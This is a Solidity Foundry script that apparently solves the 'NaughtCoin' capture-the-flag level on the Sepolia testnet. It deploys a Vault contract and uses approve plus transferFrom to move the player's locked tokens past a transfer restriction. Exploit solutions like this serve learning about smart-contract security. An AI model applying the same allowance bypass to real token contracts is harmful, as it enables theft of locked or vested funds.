// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {HelperConfig} from "./HelperConfig.s.sol";
import {NaughtCoin} from "../src/NaughtCoin.sol";

contract Vault {
    address public naughtCoin;

    constructor(address _naughtCoin) {
        naughtCoin = _naughtCoin;
    }

    receive() external payable {}

    function transfer(address player, uint256 amount) external {
        NaughtCoin(naughtCoin).transferFrom(player, address(this), amount);
    }

    function withdraw() external {
        NaughtCoin(naughtCoin).transfer(msg.sender, NaughtCoin(naughtCoin).balanceOf(address(this)));
    }
}

contract HackNaughtCoinScript is Script {
    function run() public {
        NaughtCoin naughtCoin = NaughtCoin(0x6634e53f36C8fE324CE7093B6bd66900fb10405C);
        HelperConfig helperConfig = new HelperConfig();
        address player = helperConfig.getBasicSepoliaConfig().account;
        vm.startBroadcast();
        Vault vault = new Vault(address(naughtCoin));
        naughtCoin.approve(address(vault), naughtCoin.balanceOf(player));
        vault.transfer(player, naughtCoin.balanceOf(player));
        vm.stopBroadcast();
    }
}
